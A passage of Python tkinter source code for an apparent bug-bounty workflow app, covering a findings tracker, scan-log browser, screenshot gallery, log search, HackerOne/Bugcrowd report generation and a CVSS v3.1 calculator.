            highs = sum(1 for f in load_findings() if f.get('severity','').upper() == 'HIGH')
            stats = f"Total: {total}  │  🔴 CRIT: {crits}  🟠 HIGH: {highs}  │  Showing: {inserted}"
            if hasattr(self, '_find_stats_lbl'):
                self._find_stats_lbl.config(text=stats, fg=FG2)
            self.set_status(f"Findings: {inserted} shown / {total} total", FG3)

        except Exception as e:
            self.set_status(f"Findings error: {e}", RED)

    def _sort_findings(self, col):
        if getattr(self, '_sort_col', '') == col:
            self._sort_rev = not getattr(self, '_sort_rev', True)
        else:
            self._sort_col = col
            self._sort_rev = True
        self._refresh_findings()

    def _finding_detail(self, _event=None):
        sel = self._findings_tree.selection()
        if not sel: return
        # Get actual finding ID from values[0]
        vals = self._findings_tree.item(sel[0])['values']
        if not vals: return
        fid = str(vals[0])
        f   = next((x for x in load_findings() if str(x.get('id','')) == fid), None)
        if not f:
            self.set_status(f"Finding {fid} not found", RED); return

        win = tk.Toplevel(self.root)
        win.title(f"Finding: {f.get('title','')}")
        win.configure(bg=BG); win.geometry("860x700")
        win.lift(); win.focus_force()

        sev = f.get('severity','INFO').upper()
        # Top severity bar
        tk.Frame(win, bg=SEV_COLOR(sev), height=4).pack(fill='x')
        # Title
        tk.Label(win, text=f.get('title',''), bg=BG, fg=ACCENT,
                 font=MONO_H, wraplength=800).pack(pady=(12,4))
        # Severity badge row
        badge_f = mk_frame(win, bg=BG); badge_f.pack(pady=(0,8))
        tk.Label(badge_f, text=f" {sev} ",
                 bg=SEV_COLOR(sev), fg='#000', font=MONO_B,
                 padx=8, pady=3).pack(side='left', padx=6)
        tk.Label(badge_f, text=f"CVSS {f.get('cvss_score','N/A')}",
                 bg=BG3, fg=SEV_COLOR(sev), font=MONO_B,
                 padx=8, pady=3).pack(side='left', padx=4)
        tk.Label(badge_f, text=f"Status: {f.get('status','Open')}",
                 bg=BG3, fg=FG2, font=MONO_S, padx=8, pady=3).pack(side='left', padx=4)
        tk.Label(badge_f, text=f"Project: {f.get('project','')}",
                 bg=BG3, fg=CYAN, font=MONO_S, padx=8, pady=3).pack(side='left', padx=4)

        # Content tabs
        nb = ttk.Notebook(win); nb.pack(fill='both', expand=True, padx=12, pady=8)
        for tab_name, fields in [
            ("📋 Overview",   ['description','url','type','tool']),
            ("💣 PoC",        ['poc']),
            ("💥 Impact",     ['impact']),
            ("📝 Full Data",  None),
        ]:
            tf2 = tk.Frame(nb, bg=BG2); nb.add(tf2, text=f"  {tab_name}  ")
            txt = mk_stext(tf2, h=24, bg=BG3, fg=FG); txt.pack(fill='both', expand=True, padx=8, pady=8)
            txt.config(state='normal')
            if fields:
                for k in fields:
                    val = f.get(k,'')
                    if val:
                        txt.insert('end', f"{'─'*50}\n  {k.upper()}\n{'─'*50}\n{val}\n\n")
            else:
                import json as _json
                txt.insert('end', _json.dumps(f, indent=2, default=str))
            txt.config(state='disabled')

        # Buttons
        bf = mk_frame(win, bg=BG); bf.pack(fill='x', padx=12, pady=8)
        # Status change
        tk.Label(bf, text="Status:", bg=BG, fg=FG3, font=MONO_S).pack(side='left')
        status_var = tk.StringVar(value=f.get('status','Open'))
        status_cb  = ttk.Combobox(bf, textvariable=status_var, width=14, font=MONO_S,
                                   values=["Open","In Progress","Reported","Duplicate","Not a Bug","Resolved"])
        status_cb.pack(side='left', padx=8)
        def update_status():
            findings = load_findings.__wrapped__() if hasattr(load_findings,'__wrapped__') else load_findings()
            for fx in findings:
                if str(fx.get('id','')) == fid:
                    fx['status'] = status_var.get()
                    break
            import json as _json
            p = DB_DIR / "findings.json"
            with open(p) as fh: data = _json.load(fh)
            for fx in data.get('findings',[]):
                if str(fx.get('id','')) == fid:
                    fx['status'] = status_var.get()
            with open(p,'w') as fh: _json.dump(data, fh, indent=2)
            self.set_status(f"Status updated: {status_var.get()}", GREEN)
            self._refresh_findings()
        mk_btn(bf, "💾 Update Status", update_status, GREEN, small=True).pack(side='left', padx=4)
        mk_btn(bf, "📋 Copy Title+URL", lambda: (
            self.root.clipboard_clear(),
            self.root.clipboard_append(f"{f.get('title','')} — {f.get('url','')}")
        ), ACCENT, small=True).pack(side='left', padx=4)
        mk_btn(bf, "🌐 Open URL", lambda: webbrowser.open(f.get('url','')) if f.get('url') else None,
               FG2, small=True).pack(side='left', padx=4)
        mk_btn(bf, "✕ Close", win.destroy, FG3, small=True).pack(side='right', padx=4)

    def _delete_selected_finding(self):
        sel = self._findings_tree.selection()
        if not sel: return
        vals = self._findings_tree.item(sel[0])['values']
        if not vals: return
        fid = str(vals[0])
        if not messagebox.askyesno("Delete", f"Delete finding {fid}?", parent=self.root): return
        import json as _json
        p = DB_DIR / "findings.json"
        with open(p) as f: data = _json.load(f)
        data['findings'] = [x for x in data.get('findings',[]) if str(x.get('id','')) != fid]
        with open(p,'w') as f: _json.dump(data, f, indent=2)
        self._refresh_findings()
        self.set_status(f"Deleted finding {fid}", GREEN)

    def _show_add_finding_dialog(self):
        """Quick add finding dialog from Findings tab."""
        win = tk.Toplevel(self.root)
        win.title("Add New Finding")
        win.configure(bg=BG); win.geometry("700x620")
        win.lift(); win.focus_force()
        tk.Frame(win, bg=ACCENT, height=3).pack(fill='x')
        tk.Label(win, text="+ Add New Finding", bg=BG, fg=ACCENT, font=MONO_H).pack(pady=12)

        fields = {}
        form   = mk_frame(win, bg=BG); form.pack(fill='both', expand=True, padx=20)

        for label, key, widget_type, default in [
            ("Title *",      "title",     "entry",    ""),
            ("URL",          "url",       "entry",    ""),
            ("Type",         "type",      "combo",    ["XSS","SQLi","SSRF","IDOR","RCE","Auth Bypass","Info Disclosure","CSRF","Open Redirect","Other"]),
            ("Severity *",   "severity",  "combo",    ["CRITICAL","HIGH","MEDIUM","LOW","INFO"]),
            ("CVSS Score",   "cvss_score","entry",    ""),
            ("Project",      "project",   "entry",    self.project.get()),
            ("Status",       "status",    "combo",    ["Open","In Progress","Reported"]),
        ]:
            row = mk_frame(form, bg=BG); row.pack(fill='x', pady=4)
            tk.Label(row, text=label, bg=BG, fg=FG3 if '*' not in label else FG,
                     font=MONO_S, width=14, anchor='e').pack(side='left', padx=(0,8))
            if widget_type == "entry":
                var = tk.StringVar(value=default)
                mk_entry(row, var=var, w=44).pack(side='left', ipady=3)
            else:
                var = tk.StringVar(value=default[1] if key == "severity" else default[0])
                ttk.Combobox(row, textvariable=var, values=default,
                             width=22, font=MONO_S).pack(side='left')
            fields[key] = var

        tk.Label(form, text="Description:", bg=BG, fg=FG3, font=MONO_S).pack(anchor='w', pady=(8,2))
        desc_txt = tk.Text(form, height=4, bg=BG3, fg=FG, font=MONO_S,
                           relief='flat', insertbackground=ACCENT)
        desc_txt.pack(fill='x', pady=(0,4))
        tk.Label(form, text="PoC / Steps:", bg=BG, fg=FG3, font=MONO_S).pack(anchor='w', pady=(4,2))
        poc_txt = tk.Text(form, height=4, bg=BG3, fg=FG, font=MONO_S,
                          relief='flat', insertbackground=ACCENT)
        poc_txt.pack(fill='x')

        def do_save():
            title = fields['title'].get().strip()
            sev   = fields['severity'].get().strip()
            if not title:
                messagebox.showerror("Error", "Title is required!", parent=win); return
            finding = {k: v.get() for k, v in fields.items()}
            finding['description'] = desc_txt.get('1.0','end').strip()
            finding['poc']         = poc_txt.get('1.0','end').strip()
            finding['impact']      = ""
            finding['screenshot']  = ""
            finding['tool']        = "Manual"
            finding['user']        = self.user.get('username','')
            save_finding(finding)
            win.destroy()
            self._refresh_findings()
            self.set_status(f"✅ Finding saved: {title}", GREEN)

        bf = mk_frame(win, bg=BG); bf.pack(fill='x', padx=20, pady=10)
        mk_btn(bf, "💾 Save Finding", do_save, GREEN).pack(side='left', ipady=5, padx=(0,8))
        mk_btn(bf, "✕ Cancel", win.destroy, FG3, small=True).pack(side='left')
    def _export_csv(self):
        path = filedialog.asksaveasfilename(defaultextension='.csv', filetypes=[("CSV","*.csv"),("All","*.*")])
        if not path: return
        findings = load_findings(self.project.get() if self.project.get() else None)
        with open(path,'w',newline='',encoding='utf-8') as fp:
            w = csv.writer(fp)
            w.writerow(['ID','Project','Title','Type','Severity','CVSS','URL','Status','Date','Description','PoC'])
            for f in findings:
                w.writerow([f.get('id',''),f.get('project',''),f.get('title',''),f.get('type',''),
                            f.get('severity',''),f.get('cvss_score',''),f.get('url',''),
                            f.get('status',''),f.get('timestamp','')[:10],
                            f.get('description','')[:100], f.get('poc','')[:100]])
        self.set_status(f"Exported {len(findings)} findings → {path}", GREEN)

    # ═════════════════════════════════════════════════════════════
    #  RESULTS TAB (Feature 5 — major new tab)
    # ═════════════════════════════════════════════════════════════
    def _build_results(self, frame):
        frame.configure(bg=BG2)
        nb2 = ttk.Notebook(frame); nb2.pack(fill='both', expand=True)
        tf = tk.Frame(nb2, bg=BG2); nb2.add(tf, text="  📁 Scan Results  ")
        sf = tk.Frame(nb2, bg=BG2); nb2.add(sf, text="  🖼 Screenshots  ")
        lf = tk.Frame(nb2, bg=BG2); nb2.add(lf, text="  📄 Log Viewer  ")
        self._build_results_panel(tf)
        self._build_screenshot_gallery(sf)
        self._build_log_viewer(lf)

    def _build_results_panel(self, frame):
        pad = mk_frame(frame, bg=BG2); pad.pack(fill='both', expand=True, padx=16, pady=12)
        # Filter
        fb = mk_frame(pad, bg=BG2); fb.pack(fill='x', pady=(0,10))
        tk.Label(fb, text="CATEGORY:", bg=BG2, fg=FG3, font=MONO_S).pack(side='left')
        cats = ["All","Subdomain Enum","HTTP Probe","URL Discovery","Port Scan","Vuln Scan"]
        ttk.Combobox(fb, textvariable=self.tool_filter, values=cats, width=18, font=MONO_S).pack(side='left', padx=8)
        self.tool_filter.bind = lambda *a, **k: None
        mk_btn(fb, "🔄 Refresh", self._refresh_results, FG3, small=True).pack(side='left', padx=4)
        mk_btn(fb, "📂 Open Logs Dir", lambda: open_folder(str(LOGS_DIR)), FG2, small=True).pack(side='right')
        mk_btn(fb, "🗑 Clear Results DB", self._clear_results, RED, small=True).pack(side='right', padx=4)

        # Results tree
        cols = ('Tool','Category','Count','Project','Time','File')
        self._results_tree = mk_tree(pad, columns=cols, show='headings', height=12)
        wsz2 = {'Tool':100,'Category':120,'Count':70,'Project':120,'Time':130,'File':350}
        for c in cols: self._results_tree.heading(c,text=c); self._results_tree.column(c, width=wsz2.get(c,100))
        vsb = ttk.Scrollbar(pad, orient='vertical', command=self._results_tree.yview)
        self._results_tree.configure(yscrollcommand=vsb.set)
        tf2 = mk_frame(pad, bg=BG2); tf2.pack(fill='x')
        self._results_tree.pack(side='left', fill='x', expand=True, in_=tf2)
        vsb.pack(side='right', fill='y', in_=tf2)
        self._results_tree.bind("<Double-1>", self._view_result_file)
        self._results_tree.tag_configure('has_results', foreground=GREEN, background=BG3)
        self._results_tree.tag_configure('empty',       foreground=FG3, background=BG3)

        # Content preview
        mk_section(pad, "FILE PREVIEW  (double-click result above to view)", "👁").pack(fill='x', pady=(10,6))
        paned = tk.PanedWindow(pad, orient='horizontal', bg=BG, sashwidth=4)
        paned.pack(fill='both', expand=True)

        # Line browser
        left = mk_frame(paned, bg=BG2); paned.add(left, stretch='always')
        self._result_lines = mk_tree(left, columns=('Line','Content'), show='headings', height=14)
        self._result_lines.heading('Line', text='#'); self._result_lines.column('Line', width=45)
        self._result_lines.heading('Content', text='Content'); self._result_lines.column('Content', width=400)
        vsb2 = ttk.Scrollbar(left, orient='vertical', command=self._result_lines.yview)
        self._result_lines.configure(yscrollcommand=vsb2.set)
        tf3 = mk_frame(left, bg=BG2); tf3.pack(fill='both', expand=True)
        self._result_lines.pack(side='left', fill='both', expand=True, in_=tf3)
        vsb2.pack(side='right', fill='y', in_=tf3)
        self._result_lines.tag_configure('subdomain', foreground=CYAN, background=BG3)
        self._result_lines.tag_configure('url',       foreground=GREEN, background=BG3)
        self._result_lines.tag_configure('ip',        foreground=YELLOW, background=BG3)
        self._result_lines.tag_configure('vuln',      foreground=RED, background=BG3)
        self._result_lines.tag_configure('info',      foreground=FG2, background=BG3)

        # Stats panel
        right = mk_frame(paned, bg=BG3); paned.add(right)
        tk.Label(right, text="STATS", bg=BG3, fg=ACCENT, font=MONO_B).pack(padx=10, pady=8, anchor='w')
        self._result_stats_lbl = tk.Label(right, text="—", bg=BG3, fg=FG2, font=MONO_S,
                                           justify='left', wraplength=180)
        self._result_stats_lbl.pack(padx=10, anchor='w')

        self._refresh_results()

    def _refresh_results(self):
        if not self._results_tree: return
        self._results_tree.delete(*self._results_tree.get_children())

        filt = self.tool_filter.get() if hasattr(self,'tool_filter') else "All"
        proj = self.project.get()

        rows = []

        # Scan ALL files in logs/ including project subdirectories
        if LOGS_DIR.exists():
            # Scan both top-level and one level deep (project dirs)
            patterns = list(LOGS_DIR.glob("*.txt")) + \
                       list(LOGS_DIR.glob("*.json")) + \
                       list(LOGS_DIR.glob("*/*.txt")) + \
                       list(LOGS_DIR.glob("*/*.json")) + \
                       list(LOGS_DIR.glob("*/*.csv")) + \
                       list(LOGS_DIR.glob("*/*/*.txt"))
            
            for logf in sorted(patterns, key=lambda p: p.stat().st_mtime, reverse=True):
                if logf.name.startswith('_'): continue
                try:
                    # Determine project from path
                    rel = logf.relative_to(LOGS_DIR)
                    proj_name = rel.parts[0] if len(rel.parts) > 1 else "root"
                    
                    # Filter by project if selected
                    if proj and proj_name not in (proj, "root") and proj_name != proj:
                        # Still show root-level files
                        if len(rel.parts) > 1:
                            continue

                    # Guess category
                    n = logf.name.lower()
                    cat = ("Subdomain Enum"  if any(k in n for k in ["subfinder","amass","crt","dnsx","subdomain"])
                           else "HTTP Probe" if any(k in n for k in ["httpx","http_header","screenshot"])
                           else "URL Discovery" if any(k in n for k in ["katana","gau","wayback","url","crawl","endpoint"])
                           else "Port Scan"  if any(k in n for k in ["nmap","masscan","port"])
                           else "Vuln Scan"  if any(k in n for k in ["nuclei","nikto","dalfox","sqlmap","vuln"])
                           else "Dorks"      if "dork" in n
                           else "OSINT"      if any(k in n for k in ["osint","asn","email","favicon","ip_range"])
                           else "OAST"       if "oast" in n or "interaction" in n
                           else "Race/GraphQL" if any(k in n for k in ["race","graphql","jwt"])
                           else "AI Exploit" if "ai_exploit" in str(logf)
                           else "Other")

                    if filt != "All" and cat != filt: continue

                    # Count lines / entries
                    try:
                        if logf.suffix == '.json':
                            import json as _j
                            data = _j.loads(logf.read_text(errors='replace'))
                            if isinstance(data, list):
                                count = len(data)
                            elif isinstance(data, dict):
                                count = sum(len(v) if isinstance(v,list) else 1
                                            for v in data.values())
                            else:
                                count = 1
                        else:
                            lines_list = [l for l in logf.read_text(errors='replace').splitlines() if l.strip()]
                            count = len(lines_list)
                    except Exception:
                        count = 0

                    if count == 0: continue  # skip empty files

                    mtime = datetime.fromtimestamp(logf.stat().st_mtime).strftime("%Y-%m-%d %H:%M")
                    rows.append({
                        "tool":      logf.stem,
                        "category":  cat,
                        "count":     count,
                        "project":   proj_name,
                        "timestamp": mtime,
                        "file":      str(logf),
                    })
                except Exception:
                    pass

        # Also load from results DB
        results_db = DB_DIR / "results.json"
        if results_db.exists():
            try:
                with open(results_db) as f:
                    db_results = json.load(f).get("results", [])
                for r in db_results:
                    if filt != "All" and r.get("category") != filt: continue
                    rows.append(r)
            except Exception:
                pass

        # Sort by timestamp desc
        rows.sort(key=lambda x: x.get("timestamp",""), reverse=True)

        for r in rows[:200]:
            count = r.get('count', 0)
            tag = 'has_results' if count > 0 else 'empty'
            self._results_tree.insert('', 'end', values=(
                r.get('tool','')[:30],
                r.get('category',''),
                f"{count:,}",
                r.get('project',''),
                r.get('timestamp','')[:16],
                Path(r.get('file','')).name
            ), tags=(tag,))

        self.set_status(f"Results: {len(rows)} files loaded from logs/", FG3)

    def _view_result_file(self, _event=None):
        sel = self._results_tree.selection()
        if not sel: return
        vals = self._results_tree.item(sel[0])['values']
        if not vals or len(vals) < 6: return
        fname = str(vals[5])   # filename only
        
        # Find full path — search in logs dirs
        fpath = None
        # Try direct match first (stored full path somewhere?)
        # Search logs subdirs
        for candidate in list(LOGS_DIR.rglob(fname)):
            fpath = candidate; break
        if not fpath:
            fpath = LOGS_DIR / fname
        if not fpath or not fpath.exists():
            # Ask user
            p2 = filedialog.askopenfilename(
                title=f"Locate {fname}",
                initialdir=str(LOGS_DIR),
                filetypes=[("All files","*.*")])
            if not p2: return
            fpath = Path(p2)

        try:
            content = fpath.read_text(errors='replace')
            lines_list = content.strip().splitlines()
        except Exception as e:
            messagebox.showerror("Error", str(e), parent=self.root); return

        self._result_lines.delete(*self._result_lines.get_children())
        import re as _re
        ip_re  = _re.compile(r'\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b')
        sub_re = _re.compile(r'^[a-z0-9\-\.]+\.[a-z]{2,}$')
        
        for i, line in enumerate(lines_list[:2000], 1):
            line = line.strip()
            if not line: continue
            tag = 'info'
            if line.startswith('http'):                   tag = 'url'
            elif ip_re.match(line):                       tag = 'ip'
            elif sub_re.match(line):                      tag = 'subdomain'
            elif any(k in line.lower() for k in
                     ['vuln','critical','high','found','vulnerable','error']):
                tag = 'vuln'
            self._result_lines.insert('', 'end', values=(i, line), tags=(tag,))

        sz = fpath.stat().st_size
        sz_str = f"{sz/1024:.1f} KB" if sz > 1024 else f"{sz} B"
        stats = (f"File: {fpath.name}\n"
                 f"Path: {fpath.parent.name}/\n"
                 f"Lines: {len(lines_list):,}\n"
                 f"Size: {sz_str}\n\n"
                 f"URLs: {sum(1 for l in lines_list if l.startswith('http')):,}\n"
                 f"IPs: {sum(1 for l in lines_list if ip_re.search(l)):,}\n"
                 f"Subdomains: {sum(1 for l in lines_list if sub_re.match(l.strip())):,}")
        if hasattr(self, '_result_stats_lbl'):
            self._result_stats_lbl.config(text=stats)
        self._result_stats_lbl.config(text=stats)

    def _clear_results(self):
        if messagebox.askyesno("Clear","Clear all scan results from database?", parent=self.root):
            with open(DB_DIR/"results.json","w") as f: json.dump({"results":[]}, f)
            self._refresh_results()
            self.set_status("Results cleared", FG2)

    def _build_screenshot_gallery(self, frame):
        pad = mk_frame(frame, bg=BG2); pad.pack(fill='both', expand=True, padx=16, pady=12)
        mk_section(pad, "SCREENSHOT GALLERY — GOWITNESS", "🖼").pack(fill='x', pady=(0,10))
        hr = mk_frame(pad, bg=BG2); hr.pack(fill='x', pady=(0,10))
        self._ss_proj_var = tk.StringVar()
        ttk.Combobox(hr, textvariable=self._ss_proj_var, values=self._proj_names(), width=24, font=MONO_S).pack(side='left', padx=8)
        mk_btn(hr, "🔄 Load Screenshots", self._load_screenshot_gallery, CYAN, small=True).pack(side='left', padx=4)
        mk_btn(hr, "📂 Open Folder", lambda: open_folder(str(SCREENSHOTS)), FG2, small=True).pack(side='left', padx=4)
        cols_ss = ('Filename','Size','Path')
        self._ss_tree = mk_tree(pad, columns=cols_ss, show='headings', height=18)
        for c in cols_ss:
            self._ss_tree.heading(c, text=c)
            self._ss_tree.column(c, width={'Filename':280,'Size':80,'Path':400}.get(c,100))
        vsb = ttk.Scrollbar(pad, orient='vertical', command=self._ss_tree.yview)
        self._ss_tree.configure(yscrollcommand=vsb.set)
        tf2 = mk_frame(pad, bg=BG2); tf2.pack(fill='both', expand=True)
        self._ss_tree.pack(side='left', fill='both', expand=True, in_=tf2)
        vsb.pack(side='right', fill='y', in_=tf2)
        self._ss_tree.bind("<Double-1>", self._open_screenshot)
        self._load_screenshot_gallery()

    def _load_screenshot_gallery(self):
        proj = self._ss_proj_var.get() if hasattr(self,'_ss_proj_var') else ""
        self._ss_tree.delete(*self._ss_tree.get_children())
        search_dir = SCREENSHOTS/proj if proj else SCREENSHOTS
        search_dir.mkdir(parents=True, exist_ok=True)
        found = []
        for ext in ['*.png','*.jpg','*.jpeg','*.webp']:
            found.extend(search_dir.rglob(ext))
        found.sort()
        if not found:
            # Also check gowitness default output folder
            for alt in [Path.home()/'.gowitness', Path('/tmp/screenshots')]:
                if alt.exists():
                    for ext in ['*.png','*.jpg']:
                        found.extend(alt.rglob(ext))
        for f in found:
            try:
                size = f"{f.stat().st_size//1024}KB"
                self._ss_tree.insert('','end', values=(f.name, size, str(f)))
            except Exception:
                pass

    def _open_screenshot(self, _event=None):
        sel = self._ss_tree.selection()
        if not sel: return
        path = self._ss_tree.item(sel[0])['values'][2]
        if os.path.isfile(path): open_folder(path)

    def _build_log_viewer(self, frame):
        pad = mk_frame(frame, bg=BG2); pad.pack(fill='both', expand=True, padx=16, pady=12)
        mk_section(pad, "LOG FILE VIEWER", "📄").pack(fill='x', pady=(0,10))
        hr = mk_frame(pad, bg=BG2); hr.pack(fill='x', pady=(0,10))
        self._log_file_var = tk.StringVar()
        log_files = [f.name for f in LOGS_DIR.glob("*.txt")] + [f.name for f in LOGS_DIR.glob("*.json")] + ["audit.log"]
        lf_cb = ttk.Combobox(hr, textvariable=self._log_file_var, values=log_files, width=36, font=MONO_S)
        lf_cb.pack(side='left', padx=8)
        mk_btn(hr, "📂 Browse", lambda: self._log_file_var.set(
            filedialog.askopenfilename(initialdir=str(LOGS_DIR), filetypes=[("All","*.*")])), FG2, small=True).pack(side='left')
        mk_btn(hr, "▶ Load", self._load_log_file, ACCENT, small=True).pack(side='left', padx=8)

        # Search bar
        sr = mk_frame(pad, bg=BG2); sr.pack(fill='x', pady=(0,8))
        tk.Label(sr, text="Search:", bg=BG2, fg=FG3, font=MONO_S).pack(side='left')
        self._log_search_var = tk.StringVar()
        mk_entry(sr, var=self._log_search_var, w=40).pack(side='left', padx=8, ipady=3)
        mk_btn(sr, "🔍 Find", self._search_log, CYAN, small=True).pack(side='left')
        self._log_match_lbl = tk.Label(sr, text="", bg=BG2, fg=FG3, font=MONO_S)
        self._log_match_lbl.pack(side='left', padx=8)

        # Log text
        self._log_viewer_txt = mk_stext(pad, h=26, bg=BG3, fg=FG)
        self._log_viewer_txt.pack(fill='both', expand=True, pady=(0,8))
        self._log_viewer_txt.tag_config('match', background=YELLOW, foreground=BG)

        bf = mk_frame(pad, bg=BG2); bf.pack(fill='x')
        def copy_log():
            self.root.clipboard_clear()
            self.root.clipboard_append(self._log_viewer_txt.get('1.0','end'))
            self.set_status("Log copied!", GREEN)
        mk_btn(bf, "📋 Copy", copy_log, ACCENT, small=True).pack(side='left', padx=4)
        mk_btn(bf, "💾 Save", lambda: self._save_text(self._log_viewer_txt.get('1.0','end')), FG2, small=True).pack(side='left', padx=4)
        mk_btn(bf, "🔄 Refresh Files", lambda: lf_cb.configure(values=[f.name for f in LOGS_DIR.iterdir() if f.is_file()]), FG3, small=True).pack(side='left', padx=4)

    def _load_log_file(self):
        fname = self._log_file_var.get()
        if not fname: return
        candidates = [LOGS_DIR/fname, Path(fname)]
        for c in candidates:
            if c.exists():
                try:
                    content = c.read_text(errors='replace')
                    self._log_viewer_txt.config(state='normal')
                    self._log_viewer_txt.delete('1.0','end')
                    self._log_viewer_txt.insert('end', content)
                    self._log_viewer_txt.config(state='disabled')
                    self.set_status(f"Loaded: {c.name} ({len(content.splitlines())} lines)", GREEN)
                    return
                except Exception as e:
                    messagebox.showerror("Error", str(e), parent=self.root); return
        messagebox.showinfo("Not Found", f"Log file '{fname}' not found.", parent=self.root)

    def _search_log(self):
        q = self._log_search_var.get()
        if not q: return
        self._log_viewer_txt.tag_remove('match','1.0','end')
        idx = '1.0'; count = 0
        while True:
            idx = self._log_viewer_txt.search(q, idx, nocase=True, stopindex='end')
            if not idx: break
            end = f"{idx}+{len(q)}c"
            self._log_viewer_txt.tag_add('match', idx, end)
            idx = end; count += 1
        self._log_match_lbl.config(text=f"{count} match(es)", fg=GREEN if count else RED)

    # ═════════════════════════════════════════════════════════════
    #  REPORTS
    # ═════════════════════════════════════════════════════════════
    def _build_reports(self, frame):
        frame.configure(bg=BG2)
        nb2 = ttk.Notebook(frame); nb2.pack(fill='both', expand=True)
        rf = tk.Frame(nb2, bg=BG2); nb2.add(rf, text="  📋 Report Generator  ")
        cf = tk.Frame(nb2, bg=BG2); nb2.add(cf, text="  🧮 CVSS v3.1  ")
        self._build_report_panel(rf)
        self._build_cvss_calc(cf)

    def _build_report_panel(self, frame):
        pad = mk_frame(frame, bg=BG2); pad.pack(fill='both', expand=True, padx=20, pady=16)
        mk_section(pad, "REPORT GENERATOR", "📋").pack(fill='x', pady=(0,12))
        hr = mk_frame(pad, bg=BG2); hr.pack(fill='x', pady=(0,10))
        tk.Label(hr, text="Project:", bg=BG2, fg=FG3, font=MONO_S).pack(side='left')
        ttk.Combobox(hr, textvariable=self.report_proj, values=self._proj_names(), width=28, font=MONO_S).pack(side='left', padx=8)
        tk.Label(hr, text="Author:", bg=BG2, fg=FG3, font=MONO_S).pack(side='left', padx=(16,4))
        mk_entry(hr, var=self.report_author, w=22).pack(side='left', ipady=3)
        bf = mk_frame(pad, bg=BG2); bf.pack(fill='x', pady=(0,12))
        for txt, cmd, clr in [
            ("🌐 HTML Report",      self._gen_html,   GREEN),
            ("📝 Markdown",         self._gen_md,     CYAN),
            ("🔴 HackerOne All",    self._gen_h1_all, RED),
            ("🟡 Bugcrowd All",     self._gen_bc_all, YELLOW),
        ]:
            mk_btn(bf, txt, cmd, clr).pack(side='left', padx=6, ipady=4)
        self._report_log_txt = mk_stext(pad, h=22, bg=BG3, fg=FG)
        self._report_log_txt.pack(fill='both', expand=True)

    def _report_log(self, text):
        if not self._report_log_txt: return
        self._report_log_txt.config(state='normal')
        self._report_log_txt.insert('end', text+"\n")
        self._report_log_txt.see('end')
        self._report_log_txt.config(state='disabled')

    def _get_rproj(self):
        p = self.report_proj.get() or self.project.get()
        if not p: messagebox.showwarning("No Project","Select a project first!", parent=self.root)
        return p

    def _gen_html(self):
        proj = self._get_rproj()
        if not proj: return
        path = generate_html_report(proj, load_findings(proj), self.report_author.get())
        self._report_log(f"✓ HTML report: {path}")
        webbrowser.open(f"file://{path}")
        self.set_status(f"Report saved: {path}", GREEN)

    def _gen_md(self):
        proj = self._get_rproj()
        if not proj: return
        path = generate_markdown_report(proj, load_findings(proj))
        self._report_log(f"✓ Markdown: {path}"); self.set_status(f"Markdown: {path}", GREEN)

    def _gen_h1_all(self):
        proj = self._get_rproj()
        if not proj: return
        for f in load_findings(proj):
            self._report_log(f"\n{'═'*48}\n{generate_hackerone_report(f)}")

    def _gen_bc_all(self):
        proj = self._get_rproj()
        if not proj: return
        for f in load_findings(proj):
            self._report_log(f"\n{'═'*48}\n{generate_bugcrowd_report(f)}")

    def _build_cvss_calc(self, frame):
        pad = mk_frame(frame, bg=BG2); pad.pack(fill='both', expand=True, padx=24, pady=16)
        mk_section(pad, "CVSS v3.1 BASE SCORE CALCULATOR", "🧮").pack(fill='x', pady=(0,14))
        metrics = [
            ("AV","Attack Vector",       ["N","A","L","P"]),
            ("AC","Attack Complexity",   ["L","H"]),
            ("PR","Privileges Required", ["N","L","H"]),
            ("UI","User Interaction",    ["N","R"]),
            ("S", "Scope",               ["U","C"]),
            ("C", "Confidentiality",     ["N","L","H"]),
            ("I", "Integrity",           ["N","L","H"]),
            ("A", "Availability",        ["N","L","H"]),
        ]
        CVSS_LBL = {
            "AV":{"N":"Network","A":"Adjacent","L":"Local","P":"Physical"},
            "AC":{"L":"Low","H":"High"}, "PR":{"N":"None","L":"Low","H":"High"},
            "UI":{"N":"None","R":"Required"}, "S":{"U":"Unchanged","C":"Changed"},
            "C":{"N":"None","L":"Low","H":"High"}, "I":{"N":"None","L":"Low","H":"High"},
            "A":{"N":"None","L":"Low","H":"High"},
        }
        mg = mk_frame(pad, bg=BG2); mg.pack(fill='x')
        for i,(key,name,opts) in enumerate(metrics):
            row = mk_frame(mg, bg=BG2)
            row.grid(row=i//2, column=i%2, padx=12, pady=5, sticky='ew')
            mg.columnconfigure(i%2, weight=1)
            tk.Label(row, text=f"{name} ({key}):", bg=BG2, fg=FG2, font=MONO_S, width=28, anchor='e').pack(side='left')
            var = tk.StringVar(value=opts[0]); self.cvss_vars[key] = var
            for opt in opts:
                lbl = CVSS_LBL.get(key,{}).get(opt,opt)
                ttk.Radiobutton(row, text=f"{opt}={lbl}", variable=var, value=opt, command=self._calc_cvss).pack(side='left', padx=6)
        res = mk_frame(pad, bg=BG2); res.pack(fill='x', pady=(18,6))
        self._cvss_score_lbl  = tk.Label(res, text="Score: —", bg=BG2, fg=FG,  font=('Consolas',26,'bold'))
        self._cvss_sev_lbl    = tk.Label(res, text="",         bg=BG2, fg=FG2, font=('Consolas',16,'bold'))
        self._cvss_vector_lbl = tk.Label(res, text="",         bg=BG2, fg=FG3, font=MONO_S, wraplength=600)
        self._cvss_score_lbl.pack(side='left', padx=16)
        self._cvss_sev_lbl.pack(side='left', padx=8)
        self._cvss_vector_lbl.pack(side='left', padx=16)
        bf = mk_frame(pad, bg=BG2); bf.pack(fill='x', pady=6)
        mk_btn(bf, "📋 Copy Vector",        self._copy_cvss,  CYAN,  small=True).pack(side='left', padx=4)
        mk_btn(bf, "↑ Send to PoC Builder", self._send_cvss,  GREEN, small=True).pack(side='left', padx=4)
        self._calc_cvss()

    def _calc_cvss(self):
        if not self.cvss_vars: return
        try:
            v = self.cvss_vars
            result = calculate_cvss(v["AV"].get(),v["AC"].get(),v["PR"].get(),v["UI"].get(),
                                    v["S"].get(),v["C"].get(),v["I"].get(),v["A"].get())
            score = result["score"]; sev = result["severity"]; clr = severity_color(sev)
            self._cvss_score_lbl.config(text=f"Score: {score}", fg=clr)
            self._cvss_sev_lbl.config(text=sev, fg=clr)
            self._cvss_vector_lbl.config(text=result["vector"])
            self._last_cvss = result
        except Exception as e:
            self._cvss_score_lbl.config(text=f"Error: {e}", fg=RED)

    def _copy_cvss(self):
        if self._last_cvss:
            self.root.clipboard_clear(); self.root.clipboard_append(self._last_cvss["vector"])
            self.set_status("CVSS vector copied!", GREEN)

    def _send_cvss(self):
        if self._last_cvss:
